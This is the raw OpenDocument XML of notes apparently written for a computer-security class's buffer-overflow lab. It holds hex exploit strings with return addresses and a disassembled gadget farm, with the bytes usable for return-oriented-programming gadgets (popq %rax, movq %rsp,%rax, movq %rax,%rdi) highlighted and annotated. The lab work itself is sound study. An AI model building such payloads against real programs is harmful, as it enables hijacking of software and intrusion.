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0744"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="001a72c7"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001c326d" officeooo:paragraph-rsid="001c326d"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001a0744" officeooo:paragraph-rsid="001a72c7"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="001c326d"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="001efa56"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="002083c4"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="002224e1"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#21409a" officeooo:paragraph-rsid="00237716"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#21409a" officeooo:paragraph-rsid="00252a17"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" officeooo:paragraph-rsid="00252a17"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" officeooo:paragraph-rsid="002553c6"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" officeooo:paragraph-rsid="0027ed16"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" officeooo:paragraph-rsid="00289554"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" style:text-line-through-style="none" style:text-line-through-type="none" officeooo:paragraph-rsid="00252a17"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties officeooo:paragraph-rsid="001c326d"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties officeooo:paragraph-rsid="001efa56"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties fo:color="#000000" officeooo:paragraph-rsid="002553c6"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001a0744"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#ce181e"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="002083c4"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="002224e1"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="0026089c"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#21409a"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#21409a" officeooo:rsid="002083c4"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties officeooo:rsid="0027ed16"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties officeooo:rsid="00289554"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties officeooo:rsid="002992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uch3:</text:p>
      <text:p text:style-name="P1">48 bf 34 31 33 31 32 65 36 31 48 ba fc 59 55 55 55 55 00 00 52 c3 <text:span text:style-name="T1">00 00 00 00 00 00 48 bf 34 31 33 31 32 65 36 31 48 ba fc 59 55 55 55 55 00 00 52 c3 00 00 00 00 00 00 d8 8e 65 55 00 00 00 00</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P4">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d8 8e 65 55 00 00 00 00</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5">bf 18 8f 65 55 48 ba 13 5b 55 55 55 55 00 00 52 c3 <text:span text:style-name="T1">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d8 8e 65 55 00 00 00 00</text:span></text:p>
      <text:p text:style-name="P16">0000000000001bb0 &lt;start_farm&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bb0: <text:s text:c="6"/>b8 01 00 00 00 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x1,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bb5: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001bb6 &lt;getval_127&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bb6: <text:s text:c="6"/>b8 b0 4c <text:span text:style-name="T2">89 c7</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0xc7894cb0,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bbb: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001bbc &lt;getval_386&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bbc: <text:s text:c="6"/>b8 06 35 be <text:span text:style-name="T2">58</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0x58be3506,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bc1: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001bc2 &lt;addval_142&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bc2: <text:s text:c="6"/>8d 87 <text:span text:style-name="T2">48 89 c7 c3</text:span> <text:s text:c="6"/>lea <text:s text:c="3"/>-0x3c3876b8(%rdi),%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bc8: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001bc9 &lt;getval_420&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bc9: <text:s text:c="6"/>b8 58 94 90 90 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x90909458,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bce: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001bcf &lt;getval_444&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bcf: <text:s text:c="6"/>b8 f6 <text:span text:style-name="T2">48 89 c7</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0xc78948f6,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bd4: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001bd5 &lt;addval_165&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bd5: <text:s text:c="6"/>8d 87 4a <text:span text:style-name="T2">89 c7</text:span> 90 <text:s text:c="6"/>lea <text:s text:c="3"/>-0x6f3876b6(%rdi),%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bdb: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001bdc &lt;setval_201&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bdc: <text:s text:c="6"/>c7 07 4a 58 91 90 <text:s text:c="6"/>movl <text:s text:c="2"/>$0x9091584a,(%rdi)</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1be2: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001be3 &lt;getval_404&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1be3: <text:s text:c="6"/>b8 <text:span text:style-name="T2">58</text:span> 90 c3 ee <text:s text:c="9"/>mov <text:s text:c="3"/>$0xeec39058,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1be8: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001be9 &lt;mid_farm&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1be9: <text:s text:c="6"/>b8 01 00 00 00 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x1,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bee: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001bef &lt;add_xy&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bef: <text:s text:c="6"/>48 8d 04 37 <text:s text:c="12"/>lea <text:s text:c="3"/>(%rdi,%rsi,1),%rax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bf3: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001bf4 &lt;getval_221&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bf4: <text:s text:c="6"/>b8 89 ce 94 c3 <text:s text:c="9"/>mov <text:s text:c="3"/>$0xc394ce89,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bf9: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001bfa &lt;setval_147&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1bfa: <text:s text:c="6"/>c7 07 89 ce 78 d2 <text:s text:c="6"/>movl <text:s text:c="2"/>$0xd278ce89,(%rdi)</text:p>
      <text:p text:style-name="P5"><text:soft-page-break/><text:s text:c="4"/>1c00: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c01 &lt;addval_321&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c01: <text:s text:c="6"/>8d 87 <text:span text:style-name="T2">89 ce 38 c0</text:span> <text:s text:c="6"/>lea <text:s text:c="3"/>-0x3fc73177(%rdi),%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c07: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c08 &lt;getval_102&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c08: <text:s text:c="6"/>b8 81 d1 08 c0 <text:s text:c="9"/>mov <text:s text:c="3"/>$0xc008d181,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c0d: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c0e &lt;getval_307&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c0e: <text:s text:c="6"/>b8 <text:span text:style-name="T2">48 89 e0 </text:span>90 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x90e08948,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c13: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c14 &lt;addval_137&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c14: <text:s text:c="6"/>8d 87 89 ce c2 1f <text:s text:c="6"/>lea <text:s text:c="3"/>0x1fc2ce89(%rdi),%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c1a: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c1b &lt;addval_491&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c1b: <text:s text:c="6"/>8d 87 48 89 e0 94 <text:s text:c="6"/>lea <text:s text:c="3"/>-0x6b1f76b8(%rdi),%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c21: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c22 &lt;getval_299&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c22: <text:s text:c="6"/>b8 89 d1 00 c0 <text:s text:c="9"/>mov <text:s text:c="3"/>$0xc000d189,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c27: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c28 &lt;getval_373&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c28: <text:s text:c="6"/>b8 89 c2 94 90 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x9094c289,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c2d: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c2e &lt;getval_305&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c2e: <text:s text:c="6"/>b8 8b d1 08 db <text:s text:c="9"/>mov <text:s text:c="3"/>$0xdb08d18b,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c33: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c34 &lt;setval_320&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c34: <text:s text:c="6"/>c7 07 89 ce 94 c3 <text:s text:c="6"/>movl <text:s text:c="2"/>$0xc394ce89,(%rdi)</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c3a: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c3b &lt;getval_385&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c3b: <text:s text:c="6"/>b8 <text:span text:style-name="T2">48 89 e0</text:span> 90 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x90e08948,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c40: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c41 &lt;getval_116&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c41: <text:s text:c="6"/>b8 81 d1 c3 94 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x94c3d181,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c46: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c47 &lt;getval_391&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c47: <text:s text:c="6"/>b8 89 c2 94 90 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x9094c289,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c4c: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"><text:soft-page-break/>0000000000001c4d &lt;setval_234&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c4d: <text:s text:c="6"/>c7 07 89 c2 28 d2 <text:s text:c="6"/>movl <text:s text:c="2"/>$0xd228c289,(%rdi)</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c53: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c54 &lt;getval_313&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c54: <text:s text:c="6"/>b8 8b ce 38 c0 <text:s text:c="9"/>mov <text:s text:c="3"/>$0xc038ce8b,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c59: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c5a &lt;addval_480&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c5a: <text:s text:c="6"/>8d 87 <text:span text:style-name="T2">89 c2 c3</text:span> db <text:s text:c="6"/>lea <text:s text:c="3"/>-0x243c3d77(%rdi),%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c60: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c61 &lt;setval_247&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c61: <text:s text:c="6"/>c7 07 88 c2 84 c9 <text:s text:c="6"/>movl <text:s text:c="2"/>$0xc984c288,(%rdi)</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c67: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c68 &lt;getval_216&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c68: <text:s text:c="6"/>b8 4a <text:span text:style-name="T2">89 e0 c3</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0xc3e0894a,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c6d: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c6e &lt;getval_225&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c6e: <text:s text:c="6"/>b8 1f 99 d1 c3 <text:s text:c="9"/>mov <text:s text:c="3"/>$0xc3d1991f,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c73: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c74 &lt;getval_454&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c74: <text:s text:c="6"/>b8 <text:span text:style-name="T2">89 ce 38 db</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0xdb38ce89,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c79: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c7a &lt;addval_445&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c7a: <text:s text:c="6"/>8d 87 <text:span text:style-name="T2">89 d1 08 db</text:span> <text:s text:c="6"/>lea <text:s text:c="3"/>-0x24f72e77(%rdi),%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c80: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c81 &lt;getval_400&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c81: <text:s text:c="6"/>b8 <text:span text:style-name="T2">89 d1 08 c9 </text:span><text:s text:c="9"/>mov <text:s text:c="3"/>$0xc908d189,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c86: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c87 &lt;getval_464&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c87: <text:s text:c="6"/>b8 a7 49 <text:span text:style-name="T2">89 e0</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0xe08949a7,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c8c: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c8d &lt;getval_108&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c8d: <text:s text:c="6"/>b8 76 99 c2 c3 <text:s text:c="9"/>mov <text:s text:c="3"/>$0xc3c29976,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c92: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c93 &lt;setval_393&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c93: <text:s text:c="6"/>c7 07 58 <text:span text:style-name="T2">89 e0 c3</text:span> <text:s text:c="6"/>movl <text:s text:c="2"/>$0xc3e08958,(%rdi)</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c99: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001c9a &lt;addval_341&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1c9a: <text:s text:c="6"/>8d 87 81 c2 38 c9 <text:s text:c="6"/>lea <text:s text:c="3"/>-0x36c73d7f(%rdi),%eax</text:p>
      <text:p text:style-name="P5"><text:soft-page-break/><text:s text:c="4"/>1ca0: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001ca1 &lt;setval_156&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1ca1: <text:s text:c="6"/>c7 07 <text:span text:style-name="T2">89 c2 84 d2</text:span> <text:s text:c="6"/>movl <text:s text:c="2"/>$0xd284c289,(%rdi)</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1ca7: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001ca8 &lt;setval_463&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1ca8: <text:s text:c="6"/>c7 07 89 d1 91 90 <text:s text:c="6"/>movl <text:s text:c="2"/>$0x9091d189,(%rdi)</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1cae: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001caf &lt;getval_121&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1caf: <text:s text:c="6"/>b8 89 ce 94 90 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x9094ce89,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1cb4: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001cb5 &lt;setval_136&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1cb5: <text:s text:c="6"/>c7 07 48 89 e0 c1 <text:s text:c="6"/>movl <text:s text:c="2"/>$0xc1e08948,(%rdi)</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1cbb: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001cbc &lt;addval_369&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1cbc: <text:s text:c="6"/>8d 87 48 81 e0 90 <text:s text:c="6"/>lea <text:s text:c="3"/>-0x6f1f7eb8(%rdi),%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1cc2: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">0000000000001cc3 &lt;end_farm&gt;:</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1cc3: <text:s text:c="6"/>b8 01 00 00 00 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x1,%eax</text:p>
      <text:p text:style-name="P5"><text:s text:c="4"/>1cc8: <text:s text:c="6"/>c3 <text:s text:c="21"/>retq</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P6"><text:s text:c="4"/>1bb6: <text:s text:c="6"/>b8 b0 4c <text:span text:style-name="T2">89 c7</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0xc7894cb0,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">movl %eax,%edi</text:span></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"><text:s text:c="4"/>1bbc: <text:s text:c="6"/>b8 06 35 be <text:span text:style-name="T2">58</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0x58be3506,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">popq %rax</text:span></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"><text:s text:c="4"/>1bc2: <text:s text:c="6"/>8d 87 <text:span text:style-name="T2">48 89 c7 c3</text:span> <text:s text:c="6"/>lea <text:s text:c="3"/>-0x3c3876b8(%rdi),%eax<text:tab/><text:tab/><text:span text:style-name="T3">movq %rax,%rdi</text:span></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P7"><text:s text:c="4"/>1bcf: <text:s text:c="6"/>b8 f6 <text:span text:style-name="T2">48 89 c7</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0xc78948f6,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">movq %rax,%rdi</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:s text:c="4"/>1bd5: <text:s text:c="6"/>8d 87 4a <text:span text:style-name="T2">89 c7</text:span> 90 <text:s text:c="6"/>lea <text:s text:c="3"/>-0x6f3876b6(%rdi),%eax<text:tab/><text:tab/><text:span text:style-name="T3">movl %eax,%edi</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:s text:c="4"/>1be3: <text:s text:c="6"/>b8 <text:span text:style-name="T2">58</text:span> 90 c3 ee <text:s text:c="9"/>mov <text:s text:c="3"/>$0xeec39058,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">popq %rax</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:s text:c="4"/>1c01: <text:s text:c="6"/>8d 87 <text:span text:style-name="T2">89 ce 38 c0</text:span> <text:s text:c="6"/>lea <text:s text:c="3"/>-0x3fc73177(%rdi),%eax<text:tab/><text:tab/><text:span text:style-name="T3">movl %ecx,%esi (cmp %al,%al)</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:s text:c="4"/>1c0e: <text:s text:c="6"/>b8 <text:span text:style-name="T2">48 89 e0 </text:span>90 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x90e08948,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">movq %rsp,%rax</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:s text:c="4"/>1c3b: <text:s text:c="6"/>b8 <text:span text:style-name="T2">48 89 e0</text:span> 90 <text:s text:c="9"/>mov <text:s text:c="3"/>$0x90e08948,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">movq %rsp,%rax</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:s text:c="4"/>1c5a: <text:s text:c="6"/>8d 87 <text:span text:style-name="T2">89 c2 c3</text:span> db <text:s text:c="6"/>lea <text:s text:c="3"/>-0x243c3d77(%rdi),%eax<text:tab/><text:tab/><text:span text:style-name="T3">movl %eax,%edx</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:s text:c="4"/>1c68: <text:s text:c="6"/>b8 4a <text:span text:style-name="T2">89 e0 c3</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0xc3e0894a,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">movl %esp,%eax</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:s text:c="4"/>1c74: <text:s text:c="6"/>b8 <text:span text:style-name="T2">89 ce 38 db</text:span> <text:s text:c="9"/>mov <text:s text:c="3"/>$0xdb38ce89,%eax<text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">movl %ecx,%esi (cmpl %bl,%bl)</text:span></text:p>
      <text:p text:style-name="P7"/>
